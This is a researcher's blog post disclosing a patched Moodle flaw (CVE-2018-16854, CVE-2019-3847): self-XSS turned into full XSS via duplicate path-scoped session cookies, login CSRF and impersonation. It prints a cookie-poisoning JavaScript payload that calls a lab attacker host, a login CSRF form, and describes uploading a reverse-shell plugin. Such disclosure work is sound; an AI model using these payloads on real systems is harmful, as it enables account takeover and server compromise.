---
source: daniel-thatcher
source_url: https://blog.long.lat/2019/04/09/obtaining-xss-using-moodle-features-and-minor-bugs/
title: "Obtaining XSS Using Moodle Features and Minor Bugs | Daniel Thatcher"
published: 2019-04-09T00:00:00+00:00
description: "Moodle allowed users to embed arbitrary HTML in their own dashboards, which are only visible to themselves, creating a situation which is equivalent to self-XSS. In this blog post I describe how it was possible to exploit this by setting a second session cookie with a restricted path, initially in combination with login CSRF, and then by using Moodle’s builtin impersonation functionality, to targe"
---

[Moodle](https://moodle.org/) allowed users to embed arbitrary HTML in their own dashboards, which are only visible to themselves, creating a situation which is equivalent to self-XSS. In this blog post I describe how it was possible to exploit this by setting a second session cookie with a restricted path, initially in combination with login CSRF, and then by using Moodle’s builtin impersonation functionality, to target other users. While much of the previous exploitation of self-XSS only allows the attacker to obtain read-only access to the DOM, this technique allows JavaScript to be run as the victim user, as with any regular XSS.

The following video shows how an administrator can be targeted to give an attacker shell access to the Moodle server. In this video, an administrator follows a link sent to them by an attacker. The next time the administrator logs in to their account in the same browser, a malicious plugin which gives the attacker a shell on the web server is uploaded using JavaScript.

Moodle Login CSRF XSS from Daniel Thatcher on Vimeo

![video thumbnail](https://i.vimeocdn.com/video/773820222-ebbb2976045d725d75bba43e2110c62e35119c794f7bd4f3bfa0dafb59595980-d?mw=80&q=85)

Playing in picture-in-picture

More options

Like

Add to Watch Later

Share

Play

00:00

00:16

Settings

Picture-in-Picture

Fullscreen

[Watch on Vimeo](https://vimeo.com/329096637?fl=pl&fe=vl)

QualityAuto

SpeedNormal

## Introduction

A while ago I came across some [interesting](https://www.youtube.com/watch?v=l3yThCIF7e4) [techniques](https://www.noob.ninja/2018/07/escalating-low-severity-bugs-to-high.html) for exploiting self-XSS in combination with other issues, so when I noticed the following in a [Moodle security announcement](https://moodle.org/mod/forum/discuss.php?d=371202&parent=1496356) I was very interested:

> Authenticated user\[sic\] are allowed to add HTML blocks containing scripts to their Dashboard and this is normally not a security issue because personal dashboard is visible to this user only.

While this is more of a feature than it is stored self-XSS, it does create an equivalent situation as users are able to insert arbitrary HTML and JavaScript which is run in the context of the target domain, but should only ever be rendered in their browser.

The login form also had no CSRF protection, making it possible to use the techniques I mentioned to obtain read-only access to any page a victim user is able to view. This did not allow anything of great interest to be leaked from a Moodle installation with minimal extra configurations (perhaps due to my lack of knowledge of Moodle), so I looked for ways to turn this into full XSS where I could run arbitrary JavaScript as a victim user.

## Double Session Cookies

The method I used takes advantage of the way that PHP and browsers treat multiple cookies with the same name.

### PHP

If two session cookies are sent in a request to Moodle, the first session cookie which appears in the `Cookie` header is used by PHP, while the second is ignored. So, in the request below, the first session cookie is used to identify the logged in user, while the other session cookie of the same name is ignored:

```
GET /my/ HTTP/1.1
...
Cookie: MoodleSession=0ab0af2b5369369af1fae6b097cf64f7; MoodleSession=d879cda2c1b27a4eefa02e7a48a63d73
```

This is a result of PHP’s behaviour for handling multiple cookies, which leads to only the first cookie being present in the `$_COOKIE` superglobal.

### Browsers

Chrome and Firefox[1](https://blog.long.lat/2019/04/09/obtaining-xss-using-moodle-features-and-minor-bugs/#fn:1) will generate a request containing duplicate cookies, such as the one above, when different values of the same cookie are set with different paths. So, say there are two cookies are set in the browser:

- a cookie named `MoodleSession` with a path of `/` containing a session identifier associated with Alice’s account; and
- a cookie named `MoodleSession` with a path of `/my/` containing a session identifier associated with Bob’s account.

This will lead to only Alice’s session cookie being sent in requests to paths outside of `/my/`, and both session cookies being sent in requests to `/my/`, which is the path of the user’s dashboard in Moodle. It appears that both Chrome and Firefox will send cookies with more restrictive paths first, so Bob’s session cookie will be the one sent first, and hence used by Moodle, when the browser requests `/my/`. A user of this browser will see all of the site as though they are logged in as Alice, apart from `/my/`, which will show Bob’s dashboard.

## Exploiting

The combination of CSRF on the login form and the double session cookie behaviour gives us all we need to target other users with JavaScript embedded on our dashboard. The setup I’m using is a Moodle installation located at _http://moodle.lab.local_, which contains an administrator account named admin, and a low privileged account which the attacker has access to, named attacker. There is also a server belonging to the attacker at _attacker.lab.local_. All the files used are available in [this GitHub repository](https://github.com/danielthatcher/moodle-login-csrf).

### Setup

First the attacker embeds a script such as [the one from the GitHub repository](https://github.com/danielthatcher/moodle-login-csrf/blob/master/moodle.js), part of which is shown below, in their dashboard. This is most easily done by adding a new HTML block and using an intercepting proxy such as BurpSuite.

```
// Target site, without a trailing slash
let moodleRoot = "http://moodle.lab.local";

// Attacker site without a trailing slash
let attackerRoot = "http://attacker.lab.local";

// Use the "poisoned" cookie to tell if the first stage has been completed
if (!document.cookie.includes("poisoned")) { // First stage
    let callback = function() {
        let attackerCookie = this.responseText;
        document.cookie = "MoodleSession=" + attackerCookie + "; path=/my/; expires=Thu, 31 Dec 2020 01:00:00 UTC;";
        document.cookie = "poisoned=1; path=/my/; expires=Thu, 31 Dec 2020 01:00:00 UTC;";

        // Have to logout now as can't clear cookie
        let logoutURL = document.querySelector("a[data-title='logout,moodle']").href;
        document.location.replace(logoutURL);
    };

    // Send off for attacker's cookie
    let req = new XMLHttpRequest();
    req.addEventListener("load", callback);
    req.open("GET", `${attackerRoot}/cookie.php`);
    req.send();

} else { // Second stage
  ...
```

This script will check if a cookie named `poisoned` is set in the browser. If it is not, it will set this cookie, and request a session cookie belonging to the attacker account from the [cookie.php](https://github.com/danielthatcher/moodle-login-csrf/blob/master/cookie.php) script[2](https://blog.long.lat/2019/04/09/obtaining-xss-using-moodle-features-and-minor-bugs/#fn:2) which it then puts in the `MoodleSession` cookie with a path of `/my/`. The script then causes a logout from the attacker account, which does not invalidate the newly set session cookie as it involves requests to path outside of `/my/`.

If the `poisoned` cookie is present then the script will execute the final XSS payload, which I will discuss later.

### Attack

The attacker now targets their victim user, in this case the owner of the _admin_ account, with a simple login CSRF payload such as the one below which logs the victim in to the attacker account.

```
<html>
  <body>
    <form action="http://moodle.lab.local/login/index.php" method="POST" id="loginform">
      <input type="hidden" name="anchor" value="" />
      <input type="hidden" name="username" value="attacker" />
      <input type="hidden" name="password" value="Password1!" />
    </form>
    <script>
      document.getElementById("loginform").submit();
    </script>
  </body>
</html>
```

This will cause the victim to view the dashboard of the _attacker_ account, and the script from the previous subsection to be run in their browser. The victim will then have the `poisoned` cookie and a session cookie belonging to the _attacker_ account set in their browser with a path of `/my/`, following which they will be logged out.

The next time the victim logs in to the _admin_ account in the same browser, they will be able to browse all of the Moodle installation apart from their dashboard, including the admin panel, as normal. However, the request to `/my/` to load their dashboard will return the dashboard of the attacker account with the included script. This script performs the second stage of the attack due to the presence of the `poisoned` cookie in the browser.

### Final payload

Popping an alert box or [loading in DOOM](https://labs.detectify.com/2017/07/27/how-we-invented-the-tesla-dom-doom-xss/) doesn’t obviously show impact here as it will show up on the dashboard of the _attacker_ account rather than the _admin_ account. Since we can still make requests to the admin panel as the _admin_ account, I decided to upload a [malicious plugin](https://github.com/danielthatcher/moodle-login-csrf/tree/master/shell) using JavaScript. This plugin gives the attacker a reverse shell using the [version.php](https://github.com/danielthatcher/moodle-login-csrf/blob/master/shell/version.php#L26) file.

Moodle Login CSRF XSS from Daniel Thatcher on Vimeo

![video thumbnail](https://i.vimeocdn.com/video/773820222-ebbb2976045d725d75bba43e2110c62e35119c794f7bd4f3bfa0dafb59595980-d?mw=80&q=85)

Playing in picture-in-picture

More options

Like

Add to Watch Later

Share

Play

00:00

00:16

Settings

Picture-in-Picture

Fullscreen

[Watch on Vimeo](https://vimeo.com/329096637?fl=pl&fe=vl)

QualityAuto

SpeedNormal

The JavaScript to do this can be found [here](https://github.com/danielthatcher/moodle-login-csrf/blob/master/moodle.js#L25). It is long and ugly, as well as a bit noisy, and I won’t go through it. It essentially pulls down the `plugin.zip` file from the attacker’s server[3](https://blog.long.lat/2019/04/09/obtaining-xss-using-moodle-features-and-minor-bugs/#fn:3), and replicates the requests that would be sent if the plugin were to be uploaded through the web interface.

## Using the Impersonation Functionality

Initially, Moodle only fixed the CSRF on the login form, though this still allowed the issue to be exploited using Moodle’s impersonation functionality instead. Rather than exploiting login CSRF, an attacker would have to convince an administrator to impersonate their account, causing the administrator to view the attacker’s dashboard. The exact same scripts are then used to exploit this issue.

Moodle Impersonation XSS from Daniel Thatcher on Vimeo

![video thumbnail](https://i.vimeocdn.com/video/773822387-f5b5a83c4d66c5abe6de3c24e809c9b0f3c4dca381ec1706120f92740a2d5629-d?mw=80&q=85)

Playing in picture-in-picture

More options

Like

Add to Watch Later

Share

Play

00:00

00:21

Settings

Picture-in-Picture

Fullscreen

[Watch on Vimeo](https://vimeo.com/329098357?fl=pl&fe=vl)

QualityAuto

SpeedNormal

## Disclosure Timeline

- 2018–08–18: Issue reported to Moodle with details of exploiting using login CSRF.
- 2018–08–25: Details of exploiting using impersonation functionality added to issue.
- 2018–10–25: Asked to create a separate ticket for the exploitation using the impersonation functionality.
- 2018–11–12: Login CSRF patched (Moodle versions 3.1.15, 3.3.9, 3.4.6, 3.5.3). CVE-2018–16854 and [MSA-18-0020](https://moodle.org/mod/forum/discuss.php?d=378731) assigned.
- 2019–03–11: Moodle now sets the forceclean parameter to true when in an impersonated session to prevent user controlled JavaScript from being included in user’s dashboards (Moodle versions 3.1.17, 3.4.8, 3.5.5, 3.6.3). CVE-2019–3847 and [MSA-19-0004](https://moodle.org/mod/forum/discuss.php?d=384010#p1547742) assigned.

This post was originally located at [here](https://medium.com/@daniel.thatcher/obtaining-xss-using-moodle-features-and-minor-bugs-2035665989cc). It has been moved to this blog with minor modifications.

1. Other browsers untested. [↩](https://blog.long.lat/2019/04/09/obtaining-xss-using-moodle-features-and-minor-bugs/#fnref:1)

2. The attacker’s server must return the header Access-Control-Allow-Origin: \* or equivalent along with the result of this script to allow the value to be read by JavaScript cross-domain on line 10. [↩](https://blog.long.lat/2019/04/09/obtaining-xss-using-moodle-features-and-minor-bugs/#fnref:2)

3. Again this needs to be returned with the Access-Control-Allow-Origin: \* header. [↩](https://blog.long.lat/2019/04/09/obtaining-xss-using-moodle-features-and-minor-bugs/#fnref:3)